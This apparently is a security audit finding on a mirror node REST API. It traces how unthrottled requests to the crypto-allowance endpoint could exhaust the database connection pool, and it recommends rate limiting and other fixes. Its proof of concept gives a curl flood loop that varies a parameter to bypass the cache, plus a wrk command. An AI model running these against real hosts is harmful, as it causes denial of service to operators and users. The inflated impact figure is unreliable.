### Title
Unauthenticated DB Connection Pool Exhaustion via Unbounded Concurrent Requests to `/api/v1/accounts/{id}/allowances/crypto`

### Summary
The `/api/v1/accounts/{id}/allowances/crypto` endpoint is publicly accessible with no rate limiting. Every request synchronously acquires a PostgreSQL connection from the shared finite pool via `CryptoAllowanceService.getAccountCryptoAllowances` → `BaseService.getRows` → `pool.queryQuietly`. An unprivileged attacker sending thousands of concurrent requests exhausts the connection pool, blocking all other mirror node components that depend on the same pool and degrading 30%+ of network processing capacity.

### Finding Description

**Exact code path:**

`rest/controllers/cryptoAllowanceController.js` line 80 calls `CryptoAllowanceService.getAccountCryptoAllowances(conditions, params, order, limit)`. [1](#0-0) 

`rest/service/cryptoAllowanceService.js` lines 13–16 build the query and call `super.getRows(query, params)`. [2](#0-1) 

`rest/service/baseService.js` line 56 calls `this.pool().queryQuietly(query, params)`, which acquires a connection from the global `pg` pool. [3](#0-2) 

The pool is bounded by `max: config.db.pool.maxConnections`. [4](#0-3) 

**Root cause — no rate limiting anywhere in the REST server middleware stack:**

`rest/server.js` registers: `cors`, `compression`, `httpContext`, `requestLogger`, `authHandler`, optional `metricsHandler`, optional `responseCacheCheckHandler`, then routes. No rate-limiting middleware is present at any layer. [5](#0-4) 

`rest/middleware/index.js` exports confirm: `authHandler`, `handleError`, `openApiValidator`, `requestLogger`, `requestQueryParser`, `responseCacheCheckHandler/UpdateHandler`, `responseHandler` — no rate limiter exported or used. [6](#0-5) 

A global `grep` for `rateLimit|rateLimiter|throttle|express-rate` across all `rest/**/*.js` files returns zero production hits.

**Why existing mitigations fail:**

1. **Response cache** (`responseCacheHandler`): Only active when `config.cache.response.enabled && config.redis.enabled` — optional and off by default. Even when enabled, the attacker varies `?spender.id=<N>` across requests, generating unique MD5 cache keys (`cacheKeyGenerator` hashes `req.originalUrl`), so every request is a cache miss and hits the DB. [7](#0-6) 

2. **`statement_timeout`**: Limits per-query wall time but does not prevent pool exhaustion — thousands of concurrent in-flight queries each hold a slot for the full timeout window. [8](#0-7) 

3. **`connectionTimeoutMillis`**: Controls how long a caller waits for a free slot; it does not cap the number of concurrent callers queuing against the pool.

4. **`authHandler`**: The `users` config is optional; the endpoint is a public read API requiring no credentials in standard deployments. [9](#0-8) 

### Impact Explanation
When the pool is saturated, every other mirror node component sharing the same PostgreSQL pool (transaction ingestion, balance updates, record file processing, health checks) blocks waiting for a free connection or times out. This directly degrades or halts 30%+ of mirror node processing nodes without any brute-force cryptographic attack. The `crypto_allowance` table query (`select * from crypto_allowance where owner = $1 and amount > 0 order by spender ... limit $N`) is a full index scan per request, amplifying per-request DB load. [10](#0-9) 

### Likelihood Explanation
Preconditions: none. The attacker needs only network access to the public REST API. The attack is trivially scriptable (`ab`, `wrk`, `hey`, or a simple async loop). It is repeatable indefinitely, requires no credentials, no tokens, and no knowledge of internal state. Any account ID (even `0.0.1`) is a valid path parameter, so the attacker does not need to enumerate valid accounts.

### Recommendation
1. **Add per-IP rate limiting** at the Express layer (e.g., `express-rate-limit`) applied globally before route handlers, with a low burst ceiling (e.g., 100 req/min per IP) for all `/api/v1/` endpoints.
2. **Cap DB concurrency** independently of the pool size using a semaphore or async queue (e.g., `p-limit`) in `BaseService.getRows` so that at most N queries run simultaneously regardless of how many HTTP requests arrive.
3. **Enable response caching** by default for read-only allowance endpoints with a short TTL (e.g., 5 s), reducing DB hits for repeated identical queries.
4. **Deploy an API gateway or reverse proxy** (nginx, Envoy, Cloudflare) with connection-rate and request-rate limits in front of the Node.js process as a defense-in-depth layer.

### Proof of Concept

```bash
# Requires: wrk or ab. No credentials needed.
# Step 1: Pick any valid account ID (e.g., 0.0.98 is the fee collection account on mainnet)
ACCOUNT="0.0.98"
BASE_URL="https://<mirror-node-host>"

# Step 2: Flood with concurrent requests, varying spender.id to bypass cache
for i in $(seq 1 5000); do
  curl -s "${BASE_URL}/api/v1/accounts/${ACCOUNT}/allowances/crypto?spender.id=gte:${i}" &
done
wait

# Step 3: Observe: subsequent legitimate API calls (e.g., /api/v1/transactions) return
# 503 / connection timeout errors as the DB pool is exhausted.
# Health endpoint /health/readiness will also begin failing.
```

Alternatively with `wrk`:
```bash
wrk -t 50 -c 500 -d 60s \
  "https://<mirror-node-host>/api/v1/accounts/0.0.98/allowances/crypto?spender.id=gte:1"
```

Expected result: DB pool hits `maxConnections`, all mirror node DB-dependent operations stall, readiness probe fails, processing nodes degrade.

### Citations

**File:** rest/controllers/cryptoAllowanceController.js (L76-80)
```javascript
  getAccountCryptoAllowances = async (req, res) => {
    const accountId = await EntityService.getEncodedId(req.params[filterKeys.ID_OR_ALIAS_OR_EVM_ADDRESS]);
    const filters = utils.buildAndValidateFilters(req.query, acceptedCryptoAllowanceParameters);
    const {conditions, params, order, limit} = this.extractCryptoAllowancesQuery(filters, accountId);
    const allowances = await CryptoAllowanceService.getAccountCryptoAllowances(conditions, params, order, limit);
```

**File:** rest/service/cryptoAllowanceService.js (L11-17)
```javascript
  static accountAllowanceQuery = `select * from ${CryptoAllowance.tableName}`;

  async getAccountCryptoAllowances(conditions, initParams, order, limit) {
    const {query, params} = this.getAccountAllowancesQuery(conditions, initParams, order, limit);
    const rows = await super.getRows(query, params);
    return rows.map((ca) => new CryptoAllowance(ca));
  }
```

**File:** rest/service/baseService.js (L55-57)
```javascript
  async getRows(query, params) {
    return (await this.pool().queryQuietly(query, params)).rows;
  }
```

**File:** rest/dbpool.js (L7-16)
```javascript
const poolConfig = {
  user: config.db.username,
  host: config.db.host,
  database: config.db.name,
  password: config.db.password,
  port: config.db.port,
  connectionTimeoutMillis: config.db.pool.connectionTimeout,
  max: config.db.pool.maxConnections,
  statement_timeout: config.db.pool.statementTimeout,
};
```

**File:** rest/server.js (L68-103)
```javascript
app.use(
  express.urlencoded({
    extended: false,
  })
);
app.use(express.json());
app.use(cors());

if (config.response.compression) {
  logger.info('Response compression is enabled');
  app.use(compression());
}

// logging middleware
app.use(httpContext.middleware);
app.useExt(requestLogger);

// authentication middleware - must come after httpContext and requestLogger
app.useExt(authHandler);

// metrics middleware
if (config.metrics.enabled) {
  const {metricsHandler} = await import('./middleware/metricsHandler');
  app.useExt(metricsHandler());
}

// Check for cached response
if (applicationCacheEnabled) {
  logger.info('Response caching is enabled');
  app.useExt(responseCacheCheckHandler);
}

// accounts routes
app.getExt(`${apiPrefix}/accounts`, accounts.getAccounts);
app.getExt(`${apiPrefix}/accounts/:${constants.filterKeys.ID_OR_ALIAS_OR_EVM_ADDRESS}`, accounts.getOneAccount);
app.use(`${apiPrefix}/${AccountRoutes.resource}`, AccountRoutes.router);
```

**File:** rest/middleware/index.js (L1-13)
```javascript
// SPDX-License-Identifier: Apache-2.0

export {authHandler} from './authHandler.js';
export {handleError} from './httpErrorHandler';
export {openApiValidator, serveSwaggerDocs} from './openapiHandler';
export * from './requestHandler';
export {
  cacheKeyGenerator,
  getCache,
  responseCacheCheckHandler,
  responseCacheUpdateHandler,
} from './responseCacheHandler.js';
export {default as responseHandler} from './responseHandler';
```

**File:** rest/middleware/responseCacheHandler.js (L151-153)
```javascript
const cacheKeyGenerator = (req) => {
  return crypto.createHash('md5').update(req.originalUrl).digest('hex') + CACHE_KEY_VERSION_SUFFIX;
};
```

**File:** rest/config.js (L188-216)
```javascript
const parseUsersConfig = () => {
  const users = getConfig().users || [];

  if (!Array.isArray(users)) {
    throw new InvalidConfigError('users configuration must be an array');
  }

  users.forEach((user, index) => {
    if (!user.username || typeof user.username !== 'string') {
      throw new InvalidConfigError(`users[${index}] must have a username string`);
    }
    if (!user.password || typeof user.password !== 'string') {
      throw new InvalidConfigError(`users[${index}] must have a password string`);
    }
    if (user.limit !== undefined) {
      const limit = parseInt(user.limit, 10);
      if (Number.isNaN(limit) || limit <= 0) {
        throw new InvalidConfigError(`users[${index}].limit must be a positive integer`);
      }
      user.limit = limit;
    }
  });

  const usernames = users.map((u) => u.username);
  const duplicates = usernames.filter((name, index) => usernames.indexOf(name) !== index);
  if (duplicates.length > 0) {
    throw new InvalidConfigError(`Duplicate usernames in users configuration: ${duplicates.join(', ')}`);
  }
};
```
